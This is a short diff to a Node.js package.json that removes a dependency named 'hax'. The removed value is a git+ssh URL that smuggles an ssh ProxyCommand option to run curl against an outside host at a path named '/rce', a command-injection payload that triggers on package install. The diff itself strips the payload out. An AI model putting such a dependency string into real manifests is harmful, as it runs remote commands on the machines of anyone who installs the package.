@@ -17,7 +17,6 @@
   },
   "homepage": "https://github.com/jarosinskik/symlink#readme",
   "dependencies": {
-    "express": "^4.18.1",
-    "hax":"git+ssh://-oProxyCommand=curl%20a5gfy9eff8bpqbkul12f5lmrtizgn5.x.scrt.pl/rce%20@github.com/"
+    "express": "^4.18.1"
   }
 }
